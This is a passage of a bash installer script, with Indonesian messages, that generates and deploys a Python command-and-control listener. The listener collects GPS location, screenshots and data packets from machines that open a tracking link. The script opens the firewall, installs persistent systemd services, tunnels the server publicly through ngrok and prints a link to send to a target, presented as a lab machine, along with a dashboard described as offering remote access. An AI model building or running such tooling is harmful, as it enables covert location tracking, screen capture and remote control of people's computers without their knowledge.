                    gps_cache["ip:" + client_ip] = {"lat": lat, "lon": lon, "accuracy": detail.get("accuracy"), "address": addr}
                    gps_cache["id:" + machine] = {"lat": lat, "lon": lon, "accuracy": detail.get("accuracy"), "address": addr}
                fname = os.path.join(LOG_DIR, f"gps_{client_ip}_{file_ts()}.log")
                try:
                    with open(fname, "w", encoding="utf-8") as f:
                        f.write(f"IP: {client_ip}\nWaktu: {t}\nLokasi GPS: {lat}, {lon} (akurasi {detail.get('accuracy')} m)\nAlamat: {addr}\n")
                except Exception as e:
                    emit(f" [!] Gagal simpan gps: {e}")
                record_event({
                    "time": t, "type": "gps", "ip": client_ip, "id": machine,
                    "path": "/", "location": addr or resolve_location(client_ip, machine),
                    "lat": lat, "lon": lon,
                    "detail": {"lat": lat, "lon": lon, "accuracy": detail.get("accuracy"), "address": addr, "machine": machine}, "file": fname
                })
                emit("=" * 60)
                emit(" [+] GPS DITERIMA (dari browser)")
                emit(f"     Waktu  : {t}")
                emit(f"     IP     : {client_ip}")
                emit(f"     Lokasi : {lat}, {lon} (akurasi {detail.get('accuracy')} m)")
                emit(f"     Alamat : {addr or '(tidak ada alamat ter-reverse)'}")
                emit("=" * 60)
                self._send(200, "text/plain; charset=utf-8", b"ACK")
                return
            if dtype == "screenshot":
                fname = os.path.join(LOG_DIR, f"screenshot_{client_ip}_{file_ts()}.png")
                try:
                    png = base64.b64decode(data_payload)
                except Exception as e:
                    emit(f" [!] Gagal decode screenshot: {e}")
                    self._send(400, "text/plain; charset=utf-8", b"Bad screenshot")
                    return
                with open(fname, "wb") as f:
                    f.write(png)
                record_event({
                    "time": t, "type": "screenshot", "ip": client_ip, "id": machine,
                    "path": "/", "location": resolve_location(client_ip, machine),
                    "detail": {"bytes": len(png), "size_kb": round(len(png) / 1024, 1)}, "file": fname
                })
                emit("=" * 60)
                emit(" [+] SCREENSHOT DITERIMA")
                emit(f"     Waktu : {t}")
                emit(f"     IP    : {client_ip}")
                emit(f"     Ukuran: {len(png)} bytes ({round(len(png)/1024,1)} KB)")
                emit(f"     File  : {fname}")
                emit(f"     Lihat : /screenshot/{os.path.basename(fname)} (butuh auth dashboard)")
                emit("=" * 60)
                self._send(200, "text/plain; charset=utf-8", b"ACK")
                return
            fname = os.path.join(LOG_DIR, f"{client_ip}_{file_ts()}.log")
            with open(fname, "w", encoding="utf-8") as f:
                f.write(data_payload)
            try:
                detail = json.loads(data_payload)
            except ValueError:
                detail = data_payload
            dloc, dlat, dlon = geolocate_ll(client_ip)
            record_event({
                "time": t, "type": "data", "ip": client_ip, "id": machine,
                "path": "/", "location": dloc, "lat": dlat, "lon": dlon, "detail": detail, "file": fname
            })
            emit("=" * 60)
            emit(" [+] PAKET DATA DITERIMA")
            emit(f"     Waktu : {t}")
            emit(f"     IP    : {client_ip}")
            emit(f"     File  : {fname}")
            emit("     Isi   :")
            emit(f"     {data_payload}")
            emit("=" * 60)
            self._send(200, "text/plain; charset=utf-8", b"ACK")
        except Exception as e:
            emit(f" [!] Error memproses request: {e}")
            self._send(500, "text/plain; charset=utf-8", b"Error")

    def log_message(self, format, *args):
        return


def main():
    os.makedirs(LOG_DIR, exist_ok=True)
    load_events()
    load_commands()
    load_gps_cache()
    server_address = ("", PORT)
    httpd = http.server.HTTPServer(server_address, C2Handler)
    ip = local_ip()
    emit("")
    emit("[*] C2 Listener v%s berjalan di port %d" % (VERSION, PORT))
    emit("[*] Folder log: %s" % os.path.abspath(LOG_DIR))
    emit("")
    emit("[*] LINK PELACAK (kirim ke mesin lab):")
    emit("    http://%s:%d/?id=lab-1" % (ip, PORT))
    emit("")
    emit("[*] DASHBOARD (monitoring + remote access dalam satu halaman):")
    suffix = "?pass=xxx" if DASH_PASS else ""
    emit("    http://%s:%d/dashboard%s" % (ip, PORT, suffix))
    emit("")
    emit("[*] Tekan Ctrl+C untuk menghentikan server.")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        emit("\n[*] Server dihentikan.")
        httpd.server_close()


if __name__ == "__main__":
    main()
EOF

chmod +x "$SCRIPT_NAME"
echo " [+] Listener script generated and made executable."
echo " [+] Versi terpasang: $(sed -n 's/^VERSION = //p' "$SCRIPT_NAME" | head -n 1)"
echo " [+] File $SCRIPT_NAME ditulis ulang - menimpa versi lama."

echo " [*] Opening port $PORT in firewall..."
open_port() {
    if command -v ufw > /dev/null 2>&1; then
        $SUDO ufw allow "$PORT"/tcp > /dev/null 2>&1 && echo " [+] Port $PORT opened via ufw." || echo " [!] ufw rule failed to add (run 'sudo ufw enable' first?)."
        return 0
    fi
    if command -v firewall-cmd > /dev/null 2>&1; then
        $SUDO firewall-cmd --permanent --add-port="$PORT"/tcp > /dev/null 2>&1 || true
        $SUDO firewall-cmd --reload > /dev/null 2>&1 || true
        echo " [+] Port $PORT opened via firewalld."
        return 0
    fi
    if command -v iptables > /dev/null 2>&1; then
        if $SUDO iptables -C INPUT -p tcp --dport "$PORT" -j ACCEPT > /dev/null 2>&1; then
            echo " [+] Port $PORT rule already present (iptables)."
        else
            $SUDO iptables -A INPUT -p tcp --dport "$PORT" -j ACCEPT > /dev/null 2>&1 && echo " [+] Port $PORT opened via iptables." || echo " [!] iptables rule failed to add."
        fi
        return 0
    fi
    echo " [!] No firewall tool detected. If a firewall blocks $PORT, open it manually."
}
open_port

LISTENER_MODE="nohup"
if command -v systemctl > /dev/null 2>&1; then
    LISTENER_MODE="systemd"
fi

ensure_ngrok() {
    if ! command -v ngrok > /dev/null 2>&1; then
        echo " [*] ngrok belum terpasang..."
        if command -v apt-get > /dev/null 2>&1; then
            echo " [*] Memasang ngrok via apt..."
            curl -sSL https://ngrok-agent.s3.amazonaws.com/ngrok.asc | $SUDO tee /etc/apt/trusted.gpg.d/ngrok.asc > /dev/null 2>&1 || true
            echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | $SUDO tee /etc/apt/sources.list.d/ngrok.list > /dev/null 2>&1 || true
            $SUDO apt-get update > /dev/null 2>&1 || true
            $SUDO apt-get install -y ngrok > /dev/null 2>&1 || echo " [!] Gagal install ngrok via apt."
        else
            echo " [!] Install ngrok manual: https://ngrok.com/download"
        fi
    fi

    if [ -n "$NGROK_AUTH_TOKEN" ]; then
        ngrok config add-authtoken "$NGROK_AUTH_TOKEN" > /dev/null 2>&1 || true
        return 0
    fi
    if command -v ngrok > /dev/null 2>&1 && ngrok config check > /dev/null 2>&1; then
        return 0
    fi
    echo " [!] Authtoken ngrok belum ada. Salah satu cara:"
    echo "     1) Sekali saja di server:  ngrok config add-authtoken TOKEN_ANDA"
    echo "        (lalu curl | bash polos langsung pakai ngrok)"
    echo "     2) Atau setiap run:         curl -fsSL URL | NGROK_AUTH_TOKEN=TOKEN_ANDA bash"
    return 1
}

start_services() {
    local DO_NGROK="$1"
    if [ "$LISTENER_MODE" = "systemd" ]; then
        echo " [*] Memasang systemd service (auto-restart, nyala otomatis saat boot)..."
        local PY; PY=$(command -v python3)
        local CWD; CWD=$(pwd)
        local SU="$USER"; [ -n "$SUDO_USER" ] && SU="$SUDO_USER"
        local UL=""; [ "$SU" != "root" ] && UL="User=${SU}"
        local NG; NG=$(command -v ngrok)

        $SUDO pkill -f "$SCRIPT_NAME" 2>/dev/null || true
        $SUDO pkill -f "ngrok http" 2>/dev/null || true
        sleep 1

        $SUDO tee /etc/systemd/system/c2-listener.service > /dev/null <<EOSVC
[Unit]
Description=C2 Listener
After=network.target

[Service]
${UL}
WorkingDirectory=${CWD}
ExecStart=${PY} -u ${CWD}/${SCRIPT_NAME}
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOSVC

        if [ "$DO_NGROK" = "1" ]; then
            $SUDO tee /etc/systemd/system/c2-ngrok.service > /dev/null <<EOSVC
[Unit]
Description=C2 ngrok tunnel
After=network.target

[Service]
${UL}
ExecStart=${NG} http ${PORT} --log=stdout
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOSVC
            $SUDO systemctl enable c2-ngrok > /dev/null 2>&1 || true
        else
            $SUDO systemctl disable c2-ngrok > /dev/null 2>&1 || true
        fi

        $SUDO systemctl daemon-reload
        $SUDO systemctl enable c2-listener > /dev/null 2>&1 || true
        $SUDO systemctl restart c2-listener 2>/dev/null || true
        [ "$DO_NGROK" = "1" ] && $SUDO systemctl restart c2-ngrok 2>/dev/null || true
        sleep 3
        echo " [+] systemd c2-listener : $($SUDO systemctl is-active c2-listener 2>/dev/null || echo unknown)"
        if [ "$DO_NGROK" = "1" ]; then
            echo " [+] systemd c2-ngrok    : $($SUDO systemctl is-active c2-ngrok 2>/dev/null || echo unknown)"
        fi
        echo "     Kelola: sudo systemctl status c2-listener | restart | stop"
        echo "     Log   : journalctl -u c2-listener -f"
    else
        echo " [*] Menghentikan proses lama (jika ada)..."
        pkill -f "$SCRIPT_NAME" 2>/dev/null || true
        pkill -f "ngrok http" 2>/dev/null || true
        sleep 1

        echo " [*] Starting C2 listener on port $PORT in background..."
        nohup python3 -u "$SCRIPT_NAME" >> "$SERVER_LOG" 2>&1 &
        LISTENER_PID=$!
        sleep 2
        if kill -0 "$LISTENER_PID" 2>/dev/null; then
            echo " [+] Listener berjalan (PID $LISTENER_PID)."
            echo " [+] Log server : $SERVER_LOG"
            echo " [+] Live log   : tail -f $SERVER_LOG"
            echo " [+] Stop       : pkill -f $SCRIPT_NAME"
        else
            echo " [!] Listener gagal start, cek log: $SERVER_LOG"
            tail -5 "$SERVER_LOG" 2>/dev/null || true
        fi

        if [ "$DO_NGROK" = "1" ]; then
            echo " [*] Starting ngrok tunnel -> localhost:$PORT ..."
            nohup ngrok http "$PORT" --log=stdout > ngrok.log 2>&1 &
            NGROK_PID=$!
        fi
    fi
}

fetch_ngrok_url() {
    NGROK_URL=""
    sleep 4
    for i in 1 2 3 4 5 6; do
        NGROK_URL=$(curl -s http://127.0.0.1:4040/api/tunnels | python3 -c "import sys,json;print(json.load(sys.stdin)['tunnels'][0]['public_url'])" 2>/dev/null || true)
        if [ -n "$NGROK_URL" ]; then
            break
        fi
        sleep 2
    done
    if [ -n "$NGROK_URL" ]; then
        echo " [+] Ngrok tunnel berjalan: $NGROK_URL"
    else
        echo " [!] Ngrok tidak menghasilkan public URL."
        if [ -f ngrok.log ]; then
            echo "     Error terakhir:"
            tail -3 ngrok.log 2>/dev/null || true
        fi
        echo "     Untuk systemd, cek: journalctl -u c2-ngrok -n 20"
    fi
}

echo " [*] Detecting server IP..."
TS_IP=""
detect_ip() {
    if command -v tailscale > /dev/null 2>&1; then
        TS_IP=$(tailscale ip -4 2>/dev/null | awk '{print $1}')
    fi
    if command -v hostname > /dev/null 2>&1; then
        local ip
        ip=$(hostname -I 2>/dev/null | awk '{print $1}')
        if [ -n "$ip" ] && [ "$ip" != "127.0.0.1" ]; then
            echo "$ip"
            return
        fi
    fi
    if command -v ipconfig > /dev/null 2>&1; then
        local ip
        ip=$(ipconfig getifaddr en0 2>/dev/null || ipconfig getifaddr en1 2>/dev/null)
        if [ -n "$ip" ]; then
            echo "$ip"
            return
        fi
    fi
    echo "127.0.0.1"
}
SERVER_IP=$(detect_ip)

echo "=================================================================="
echo " Setup Complete!"
echo ""
echo " [1] Tracking link - READY TO SEND to Windows lab machine:"
echo "     http://${SERVER_IP}:${PORT}/?id=lab-1"
echo "     (opsional: ganti 'lab-1' dengan nama unik mesin, misal ?id=win-lab-2)"
echo ""
echo " [2] Dashboard (monitoring + Remote Access mesin lab dalam satu halaman):"
echo "     http://${SERVER_IP}:${PORT}/dashboard"
if [ -n "$TS_IP" ]; then
    echo "     (via Tailscale: http://${TS_IP}:${PORT}/dashboard)"
fi
echo ""
echo " [3] Restart semua service (systemd):  sudo systemctl restart c2-listener c2-ngrok"
echo "     (tanpa systemd: python3 -u $SCRIPT_NAME)"
echo ""
echo " [4] Jika server adalah VM cloud, buka port $PORT di security group."
echo "=================================================================="

NGROK_URL=""
if ensure_ngrok; then
    start_services "1"
    fetch_ngrok_url
else
    echo " [*] Listener tetap jalan (tanpa ngrok) sampai token diberikan..."
    start_services "0"
fi

echo ""
echo "=================================================================="
echo " URL AKHIR"
if [ -n "$NGROK_URL" ]; then
echo " [NGROK] Dashboard : $NGROK_URL/dashboard"
echo " [NGROK] Link lab  : $NGROK_URL/?id=lab-1"
echo "         (dashboard berisi monitoring + remote access; bisa tembus proxy browser)"
fi
echo " [LAN]  Dashboard : http://${SERVER_IP}:${PORT}/dashboard"
echo " [LAN]  Link lab  : http://${SERVER_IP}:${PORT}/?id=lab-1"
echo "=================================================================="
